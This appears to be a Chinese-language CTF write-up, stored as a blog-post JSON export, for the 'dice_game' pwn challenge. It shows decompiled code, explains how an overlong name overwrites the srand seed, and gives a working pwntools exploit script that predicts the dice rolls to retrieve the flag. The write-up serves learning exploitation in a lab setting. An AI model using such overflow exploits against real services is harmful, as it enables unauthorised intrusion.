{"title":"攻防世界 -dice_game","slug":"攻防世界-pwn-dice_game","date":"2020-07-22","updated":"2020-09-10","comments":true,"path":"api/posts/3013.json","excerpt":null,"cover":"https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png","covers":["https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png","https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png"],"content":"<h2 id=\"0x01-Checksec\"><a href=\"#0x01-Checksec\" class=\"headerlink\" title=\"0x01 Checksec\"></a>0x01 Checksec</h2><p>linux 下 checksec 查壳，开启了 relro nx pie 防护：</p>\n<p><img src=\"https://i.loli.net/2020/07/23/z2ZEWmAGM3POHqt.png\" alt=\"pwn-checksec.PNG\"></p>\n<h2 id=\"0x02- 分析\"><a href=\"#0x02- 分析\" class=\"headerlink\" title=\"0x02 分析\"></a>0x02 分析 </h2><p>IDA 打开，主函数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char buf[55]; &#x2F;&#x2F; [rsp+0h] [rbp-50h]</span><br><span class=\"line\">  char v5; &#x2F;&#x2F; [rsp+37h] [rbp-19h]</span><br><span class=\"line\">  ssize_t v6; &#x2F;&#x2F; [rsp+38h] [rbp-18h]</span><br><span class=\"line\">  unsigned int seed[2]; &#x2F;&#x2F; [rsp+40h] [rbp-10h]</span><br><span class=\"line\">  unsigned int v8; &#x2F;&#x2F; [rsp+4Ch] [rbp-4h]</span><br><span class=\"line\">  memset(buf, 0, 0x30uLL);</span><br><span class=\"line\">  *(_QWORD *)seed &#x3D; time(0LL);</span><br><span class=\"line\">  printf(&quot;Welcome, let me know your name: &quot;, a2);</span><br><span class=\"line\">  fflush(stdout);</span><br><span class=\"line\">  v6 &#x3D; read(0, buf, 0x50uLL);</span><br><span class=\"line\">  if (v6 &lt;&#x3D; 49)</span><br><span class=\"line\">    buf[v6 - 1] &#x3D; 0;</span><br><span class=\"line\">  printf(&quot;Hi, %s. Let&#39;s play a game.\\n&quot;, buf);</span><br><span class=\"line\">  fflush(stdout);</span><br><span class=\"line\">  srand(seed[0]);</span><br><span class=\"line\">  v8 &#x3D; 1;</span><br><span class=\"line\">  v5 &#x3D; 0;</span><br><span class=\"line\">  while (1)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    printf(&quot;Game %d&#x2F;50\\n&quot;, v8);</span><br><span class=\"line\">    v5 &#x3D; sub_A20();</span><br><span class=\"line\">    fflush(stdout);</span><br><span class=\"line\">    if (v5 !&#x3D; 1)</span><br><span class=\"line\">      break;</span><br><span class=\"line\">    if (v5)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      if (v8 &#x3D;&#x3D; 50)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        sub_B28(buf);</span><br><span class=\"line\">        break;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      ++v8;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  puts(&quot;Bye bye!&quot;);</span><br><span class=\"line\">  return 0LL;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p> 是一个 srand 函数程序，输入与随机出来的数匹配，则将进入 flag 的函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __fastcall sub_B28(__int64 a1)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char s; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class=\"line\">  FILE *stream; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class=\"line\">  printf(&quot;Congrats %s\\n&quot;, a1);</span><br><span class=\"line\">  stream &#x3D; fopen(&quot;flag&quot;, &quot;r&quot;);</span><br><span class=\"line\">  fgets(&amp;s, 100, stream);</span><br><span class=\"line\">  puts(&amp;s);</span><br><span class=\"line\">  return fflush(stdout);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p> 在输入 name 时，令输入数据覆盖 srand 函数内部随机种子，就可以控制随机数的生成。</p>\n<p><img src=\"https://i.loli.net/2020/07/23/fxEhB6bCWcH9enR.png\" alt=\"相差 40.PNG\"></p>\n<p> 随机树种子地址与输入名字的 buf 地址之间相差 0x40, 所以将 seed 覆盖掉 </p>\n<h2 id=\"0x03-exp\"><a href=\"#0x03-exp\" class=\"headerlink\" title=\"0x03 exp\"></a>0x03 exp</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">from ctypes import *</span><br><span class=\"line\">p&#x3D;remote(&#39;220.249.52.133&#39;,34691)</span><br><span class=\"line\">libc&#x3D;cdll.LoadLibrary(&quot;libc.so.6&quot;)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">payload&#x3D;0x40*&#39;a&#39;+p64(0)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">a&#x3D;[]</span><br><span class=\"line\">for i in range(50):</span><br><span class=\"line\">    a.append(libc.rand()%6+1)</span><br><span class=\"line\">print(a)</span><br><span class=\"line\">for i in a:</span><br><span class=\"line\">    p.recv()</span><br><span class=\"line\">    print(p.recv())</span><br><span class=\"line\">    p.sendline(str(i))</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>","url":"/posts/3013/","min2read":2,"word4post":390,"prev_post":{"title":"攻防世界 -pwn-stack2","url":"/posts/14181/"},"next_post":{"title":"漏洞战争学习笔记 1：CVE-2010-2883","url":"/posts/53423/"},"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"0x01-Checksec\" href = \"#\"><span class=\"toc-number\">1.</span> <span class=\"toc-text\">0x01 Checksec</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"0x02- 分析\" href = \"#\"><span class=\"toc-number\">2.</span> <span class=\"toc-text\">0x02 分析 </span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"0x03-exp\" href = \"#\"><span class=\"toc-number\">3.</span> <span class=\"toc-text\">0x03 exp</span></a></li></ol>","categories":[],"tags":[{"name":"pwn","path":"api/tags/pwn.json","url":"/tags/pwn/"}]}